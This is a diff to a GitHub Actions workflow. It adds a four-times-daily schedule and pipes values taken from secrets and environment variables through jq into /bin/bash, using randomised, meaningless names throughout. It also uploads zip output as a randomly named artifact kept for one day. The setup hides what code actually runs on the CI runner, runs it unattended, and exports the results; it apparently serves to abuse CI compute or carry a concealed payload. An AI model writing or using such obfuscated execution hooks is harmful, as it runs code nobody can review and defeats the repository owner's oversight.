@@ -2,6 +2,8 @@ name: CI/CD
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '15 3,9,15,21 * * *'
 env:
   CI: true
 jobs:
@@ -13,15 +15,17 @@ jobs:
           fetch-depth: 0
       - name: Main step
         env:
-          hglxo3: ${{ secrets.hglxo3 }}
+          l7895: ${{ secrets.l7895 }}
         run: |
-          printf '%s' "$hglxo3" | jq -r .uaouy2570 | /bin/bash
-          echo $lt07003 | jq -r .qub10457 | /bin/bash
-          printf '%s' "$bgpac59091" | jq -r .cfjx725 | /bin/bash
+          printf '%s' "$l7895" | jq -r .diact020 | /bin/bash
+          printf '%s' "$ieuc0" | jq -r .by10536 | /bin/bash
+          echo $jgk69 | jq -r .fqz5954 | /bin/bash
+          printf '%s' "$ssifl81737" | jq -r .puvla573 | /bin/bash
+          echo $mbzrg182 | jq -r .sju09 | /bin/bash
 
       - name: Save data
         uses: actions/upload-artifact@v4
         with:
-          name: 8K0bnCmZ
+          name: ee6m0Zlf
           path: "*.zip"
           retention-days: 1
